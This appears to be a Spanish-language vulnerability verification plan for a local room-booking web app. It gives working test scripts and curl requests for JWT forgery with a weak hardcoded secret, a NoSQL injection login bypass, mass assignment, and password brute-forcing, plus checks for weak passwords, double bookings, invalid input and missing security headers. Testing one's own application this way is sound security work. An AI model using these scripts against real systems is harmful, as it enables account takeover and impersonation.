# Pruebas de Verificación de Vulnerabilidades

## Fecha: 2026-02-02
**Objetivo**: Demostrar la existencia de las vulnerabilidades identificadas mediante pruebas prácticas

---

## Requisitos Previos

1. Servidor del proyecto corriendo:
```bash
cd Reservas
npm install
npm start
# Servidor en http://localhost:3000
```

2. Base de datos MongoDB corriendo
3. Herramientas: curl, Postman, o similar

---

## ✅ PRUEBA 1: Verificar JWT Secret Débil

### Objetivo
Demostrar que el JWT_SECRET es predecible y permite generar tokens falsos.

### Pasos

1. **Crear un script para generar token falso**:

```javascript
// test-jwt-fake.js
const jwt = require('jsonwebtoken');

// El secret está hardcodeado en .env
const WEAK_SECRET = 'secreto123';

// Generar token para cualquier usuario
const fakeToken = jwt.sign(
  { id: '507f1f77bcf86cd799439011' }, // ID de usuario falso
  WEAK_SECRET,
  { expiresIn: '1h' }
);

console.log('Token falso generado:');
console.log(fakeToken);
```

2. **Ejecutar**:
```bash
node test-jwt-fake.js
```

3. **Usar el token falso**:
```bash
curl -X POST http://localhost:3000/api/reservas \
  -H "Authorization: Bearer <TOKEN_FALSO>" \
  -H "Content-Type: application/json" \
  -d '{
    "fecha": "2026-02-10",
    "hora": "10:00",
    "sala": "Sala A"
  }'
```

### Resultado Esperado
✅ La reserva se crea exitosamente con un token falsificado
❌ Demuestra que cualquiera puede suplantar usuarios

---

## ✅ PRUEBA 2: Ataque de Inyección NoSQL

### Objetivo
Bypassear la autenticación usando inyección NoSQL.

### Pasos

1. **Intento de login normal**:
```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "usuario@test.com",
    "password": "password123"
  }'
```

2. **Intento con payload de inyección**:
```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": {"$gt": ""},
    "password": {"$gt": ""}
  }'
```

### Resultado Esperado
Si la vulnerabilidad existe:
- El servidor acepta el objeto JSON en lugar de string
- MongoDB ejecuta la consulta con operador $gt (greater than)
- `User.findOne({ email: {"$gt": ""} })` devuelve el primer usuario
- Se genera un token válido sin conocer credenciales

### Resultado Real
⚠️ Depende de cómo Express parsee el JSON. Si no hay validación, es vulnerable.

---

## ✅ PRUEBA 3: Mass Assignment Attack

### Objetivo
Crear reserva en nombre de otro usuario sobrescribiendo el userId.

### Pasos

1. **Registrar dos usuarios**:
```bash
# Usuario 1
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "usuario1@test.com",
    "password": "password123"
  }'

# Usuario 2
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "usuario2@test.com",
    "password": "password456"
  }'
```

2. **Login como Usuario 1**:
```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "usuario1@test.com",
    "password": "password123"
  }'
# Guardar el token
```

3. **Intentar crear reserva con userId de Usuario 2**:
```bash
curl -X POST http://localhost:3000/api/reservas \
  -H "Authorization: Bearer <TOKEN_USUARIO_1>" \
  -H "Content-Type: application/json" \
  -d '{
    "fecha": "2026-02-10",
    "hora": "10:00",
    "sala": "Sala A",
    "userId": "<ID_USUARIO_2>"
  }'
```

### Resultado Esperado
❌ La reserva se crea con userId de Usuario 2 (vulnerable)
✅ Debería rechazar el userId del body

---

## ✅ PRUEBA 4: Ataque de Fuerza Bruta (Sin Rate Limiting)

### Objetivo
Demostrar que no hay límite de intentos de login.

### Pasos

1. **Script de fuerza bruta**:

```javascript
// brute-force-test.js
const axios = require('axios');

const passwords = [
  '123456', 'password', '12345678', 'qwerty', '123456789',
  'abc123', 'password123', 'admin', 'letmein', 'welcome'
];

async function bruteForce(email) {
  console.log(`Probando ${passwords.length} contraseñas para ${email}...`);

  let attempts = 0;
  const startTime = Date.now();

  for (const password of passwords) {
    attempts++;
    try {
      const response = await axios.post('http://localhost:3000/api/auth/login', {
        email,
        password
      });

      console.log(`✅ ÉXITO! Contraseña encontrada: ${password}`);
      console.log(`Token: ${response.data.token}`);
      return;
    } catch (error) {
      console.log(`❌ Intento ${attempts}: ${password} - Fallido`);
    }
  }

  const duration = (Date.now() - startTime) / 1000;
  console.log(`\nSe realizaron ${attempts} intentos en ${duration} segundos`);
  console.log(`Sin rate limiting detectado! ⚠️`);
}

bruteForce('usuario@test.com');
```

2. **Ejecutar**:
```bash
node brute-force-test.js
```

### Resultado Esperado
✅ Todos los intentos se procesan sin restricción
❌ Demuestra ausencia de rate limiting

---

## ✅ PRUEBA 5: Contraseñas Débiles Aceptadas

### Objetivo
Demostrar que se aceptan contraseñas triviales.

### Pasos

1. **Intentar registrar con contraseña muy débil**:
```bash
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@weak.com",
    "password": "1"
  }'
```

2. **Intentar con solo letras**:
```bash
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@weak2.com",
    "password": "abc"
  }'
```

### Resultado Esperado
✅ Ambos registros son aceptados
❌ Demuestra falta de política de contraseñas

---

## ✅ PRUEBA 6: Doble Reserva (Sin Validación de Conflictos)

### Objetivo
Demostrar que se pueden crear múltiples reservas para la misma sala/hora.

### Pasos

1. **Crear primera reserva**:
```bash
curl -X POST http://localhost:3000/api/reservas \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "fecha": "2026-02-10",
    "hora": "10:00",
    "sala": "Sala A"
  }'
```

2. **Crear segunda reserva idéntica**:
```bash
curl -X POST http://localhost:3000/api/reservas \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "fecha": "2026-02-10",
    "hora": "10:00",
    "sala": "Sala A"
  }'
```

### Resultado Esperado
✅ Ambas reservas se crean
❌ Demuestra falta de validación de conflictos

---

## ✅ PRUEBA 7: Datos Inválidos en Reserva

### Objetivo
Demostrar que se aceptan datos con formato incorrecto.

### Pasos

1. **Fecha inválida**:
```bash
curl -X POST http://localhost:3000/api/reservas \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{
    "fecha": "fecha-invalida",
    "hora": "25:99",
    "sala": ""
  }'
```

2. **Campos faltantes**:
```bash
curl -X POST http://localhost:3000/api/reservas \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{}'
```

### Resultado Esperado
✅ Las reservas se crean con datos inválidos
❌ Demuestra falta de validación de entrada

---

## ✅ PRUEBA 8: Verificar Headers de Seguridad

### Objetivo
Comprobar ausencia de headers de seguridad HTTP.

### Pasos

```bash
curl -I http://localhost:3000/api/auth/login
```

### Resultado Esperado
Ausencia de:
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `X-XSS-Protection: 1; mode=block`
- `Strict-Transport-Security`
- `Content-Security-Policy`

---

## 📊 Resumen de Resultados Esperados

| Prueba | Vulnerabilidad | Estado Esperado |
|--------|----------------|-----------------|
| 1 | JWT Secret Débil | ❌ VULNERABLE |
| 2 | Inyección NoSQL | ⚠️ POSIBLEMENTE VULNERABLE |
| 3 | Mass Assignment | ❌ VULNERABLE |
| 4 | Sin Rate Limiting | ❌ VULNERABLE |
| 5 | Contraseñas Débiles | ❌ VULNERABLE |
| 6 | Doble Reserva | ❌ VULNERABLE |
| 7 | Datos Inválidos | ❌ VULNERABLE |
| 8 | Headers Seguridad | ❌ VULNERABLE |

---

## 📝 Notas para Documentación

1. **Tomar capturas de pantalla** de cada prueba
2. **Guardar los comandos curl** utilizados
3. **Documentar las respuestas** del servidor
4. **Crear evidencia** de cada vulnerabilidad encontrada

---

## ⚠️ Advertencia

Estas pruebas deben realizarse ÚNICAMENTE en entornos de desarrollo/prueba.
NO ejecutar en producción sin autorización explícita.

---

*Documento de pruebas generado el 2026-02-02*
